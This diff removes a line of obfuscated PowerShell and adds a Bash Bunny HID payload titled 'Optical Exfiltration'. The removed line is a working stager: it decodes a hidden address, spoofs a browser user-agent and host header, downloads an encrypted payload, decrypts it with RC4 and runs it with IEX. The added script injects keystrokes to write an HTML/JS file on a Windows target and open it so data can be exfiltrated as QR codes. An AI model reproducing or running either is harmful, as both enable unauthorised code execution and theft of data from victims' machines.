@@ -1,1 +1,73 @@
-${p`o5}= [tYpE]("{3}{2}{0}{1}"-F'ODI','NG','C','TeXT.EN')  ;   set ('rL8a'+'K') ( [TYPE]("{1}{0}"-F'Vert','COn') ); seT-Item  vaRIABle:UaM3F  ([tyPe]("{1}{4}{0}{3}{2}{5}"-f'.','sySt','T.','Ne','EM','weBReQUEST')); SeT-itEM  ('vA'+'R'+'i'+'ABLE:'+'Y1B6') ( [tyPE]("{5}{4}{0}{3}{1}{2}"-F 'TEm.nET.cr','EnTIALc','AcHE','ed','s','sY') ); ${0o9`j2c}= [TypE]("{5}{4}{3}{0}{1}{2}"-F'.TEXT','.e','ncOdInG','stEm','y','s')  ; ${erROraC`TioN`PRe`F`E`RE`NcE} = ("{1}{2}{0}{3}{4}" -f'yCo','Sile','ntl','ntin','ue');${0`97c}=.("{2}{1}{0}"-f'ObJeCt','eW-','N') ("{6}{1}{0}{5}{3}{4}{2}"-f 'NeT.','M.','T','e','N','WebClI','SYSTE');${u}=(("{15}{3}{0}{12}{17}{4}{13}{10}{18}{23}{22}{25}{21}{24}{1}{5}{20}{19}{2}{14}{26}{9}{7}{8}{6}{16}{11}"-f 'lla/5.','L, like Geck','e','i','in64; ','o','Sa','10','4 ','.','64) ','ari/537.36','0','x','/88.0.43','Moz','f',' (Windows NT 10.0; W','AppleWe',' Chrom',')','HT','/','bKit','M','537.36 (K','24'));${s`ER}=$( ( get-item ("vAR"+"iabLe:P"+"o"+"5")  )."v`AluE"::"u`NiCoDe"."ge`T`sTRINg"( (vARiaBLE ('RL8a'+'k')  -VaLUEo  )::("{3}{2}{1}{0}{4}" -f'6','E','as','FrOMB','4STriNg').Invoke(("{11}{6}{1}{9}{5}{3}{12}{4}{7}{10}{8}{0}{2}" -f 'gAwAC8AOgA4A','AHQA','DAA','3','LgAx','A6AC8ALwA5ADkALgA','B0','ADAA','AuADIAM','cA','Mw','aA','ADkA'))));${T}=("{2}{0}{1}" -f'onfig','uration','/c');${0`97c}."heaD`ERS".("{0}{1}"-f 'A','dD').Invoke(("{2}{1}{0}" -f 'nt','ser-Age','U'),${U});${0`97C}."p`ROxY"= (geT-VariAbLE  UAM3F )."val`UE"::"defAulT`WEb`pRoXy";${09`7c}."pR`OXy"."CreDe`NtI`ALs" =   (ITEM ('Va'+'r'+'I'+'Able:'+'y1B6')  )."Va`lue"::"De`Fa`Ult`NETWOR`kCR`edeNtI`Als";${scri`pt:`pROXY} = ${0`97C}."prO`xY";${k}= ${0`O`9j2C}::"ASC`ii".("{1}{2}{0}" -f'es','GEtB','yt').Invoke(("{5}{3}{4}{2}{6}{0}{1}"-f 'pYS96QU','Zwq!eki','tmW1X','G','%;Mvau_f,=','&','?'));${r}={${D},${K}=${aR`gs};${S}=0..255;0..255|.('%'){${j}=(${j}+${s}[${_}]+${k}[${_}%${k}."C`OUnt"])%256;${s}[${_}],${S}[${j}]=${s}[${J}],${s}[${_}]};${D}|.('%'){${I}=(${i}+1)%256;${H}=(${H}+${s}[${i}])%256;${S}[${i}],${S}[${h}]=${S}[${h}],${S}[${I}];${_}-bxOR${S}[(${S}[${I}]+${S}[${h}])%256]}};tRY{${i`g}=${09`7c}.("{2}{3}{0}{1}" -f'OA','dDaTA','D','ownL').Invoke(${s`er})}CaTCH{};${09`7C}."H`Ead`ers".("{1}{0}"-f 'DD','A').Invoke(("{0}{1}" -f 'ho','st'),("{4}{5}{8}{3}{6}{0}{2}{7}{1}" -f 'ree','t','dge.','tr','co','ntent','acker4.azu','ne','-'));${09`7C}."Hea`ders".("{1}{0}" -f'dD','A').Invoke(("{1}{0}" -f 'e','Cooki'),("{10}{5}{7}{9}{8}{2}{1}{0}{4}{6}{3}"-f'SX0A','bDSJ','U','JWYVw=','98IxBH/','C','m','afiRQQi','et0','w=c9','BuKEDWt'));${d`ATa}=${09`7C}.("{1}{0}{2}"-f'DD','DOwNLoA','AtA').Invoke(${S`Er}+${t});${i`V}=${da`TA}[0..3];${D`ATa}=${D`Ata}[4..${DA`Ta}."LE`NG`TH"];-jOIN[Char[]](& ${r} ${DA`Ta} (${iV}+${k}))|&("{1}{0}" -f'X','IE')
+#!/bin/bash
+#
+# Title:         Optical Exfiltration
+# Author:        stormyordos from bg-wa's version
+# Version:       1.0
+# Category:      HID
+# Target:        Windows
+# Attackmodes:   HID
+# Sources:       Hak5 2320, https://github.com/bg-wa/QRExtractor
+#
+# Quick HID only attack to write an HTML/JS file to target machine
+# and open a browser, to exfiltrate data Using QR Codes and a video
+# recording device.
+#
+# Optional html params:
+# base64: Passing a base64 string to this param will auto-start processing QR Codes.
+#
+# playback: Passing the string "finish" to this param will auto-play the results,
+#           when QR codes finish rendering.
+#
+# Example:
+# Ln65: Q STRING firefox "$target_html?playback=finish&base64=my_long_string"
+#
+# | Attack Stage        | Description                              |
+# | ------------------- | ---------------------------------------- |
+# | SETUP               | Open vi                                  |
+# | ATTACK              | Writing HTML                             |
+# | FINISH              | Browser Ready/Processing                            |
+#
+
+ATTACKMODE HID
+LED SETUP
+
+target_html=\~\/index.html
+
+RUN WIN cmd.exe
+Q DELAY 1000
+Q STRING del "$target_html"
+Q ENTER
+Q DELAY 500
+Q STRING notepad "$target_html"
+Q ENTER
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+
+
+LED ATTACK
+
+payload_dir=/root/udisk/payloads/$SWITCH_POSITION
+source_html=$payload_dir/index.min.html
+
+while IFS= read data
+do
+    if [ "${data}" = " " ]
+    then
+       Q SPACE
+    else
+       Q STRING "$data"
+    fi
+done < "$source_html"
+
+Q CTRL S
+Q ALT F4
+Q STRING exit
+Q ENTER
+Q DELAY 500
+
+Q WIN R
+Q STRING chrome "$target_html"
+Q ENTER
+
+LED FINISH
